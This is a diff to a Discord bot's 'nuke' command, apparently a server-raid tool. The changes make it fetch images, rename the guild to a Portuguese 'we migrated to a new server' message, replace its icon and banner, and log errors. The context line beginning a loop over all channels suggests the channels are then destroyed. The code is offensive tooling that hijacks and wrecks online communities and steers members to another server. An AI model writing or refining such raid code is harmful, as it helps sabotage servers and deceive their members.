@@ -42452,16 +42452,21 @@ async def nuke_cmd(ctx: commands.Context):
 
     try:
         import aiohttp as _ah_nuke
-        _icon_url  = "https://media.discordapp.net/attachments/1522437136467365950/1522491015125139506/43493532-ea1d-471a-baa4-495911ca60a8.png"
+        _icon_url   = "https://cdn.discordapp.com/attachments/1522437136467365950/1522491015125139506/43493532-ea1d-471a-baa4-495911ca60a8.png"
         _banner_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522489678555512943/58abd6a6-5b73-4135-aa87-3339d5271c10.png"
         async with _ah_nuke.ClientSession() as _s_nuke:
             async with _s_nuke.get(_icon_url) as _r_icon:
                 _icon_bytes = await _r_icon.read()
             async with _s_nuke.get(_banner_url) as _r_banner:
                 _banner_bytes = await _r_banner.read()
-        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", icon=_icon_bytes, banner=_banner_bytes, reason="Nuke — renomear servidor, foto e banner")
-    except Exception:
-        pass
+        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", icon=_icon_bytes, banner=_banner_bytes, reason="Nuke")
+        print(f"[nuke] servidor {guild.id} renomeado e foto/banner alterados", flush=True)
+    except Exception as _e_guild:
+        print(f"[nuke] erro ao editar servidor {guild.id}: {type(_e_guild).__name__}: {_e_guild}", flush=True)
+        try:
+            await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!")
+        except Exception as _e2:
+            print(f"[nuke] erro ao renomear: {_e2}", flush=True)
 
     for ch in list(guild.channels):
         try:
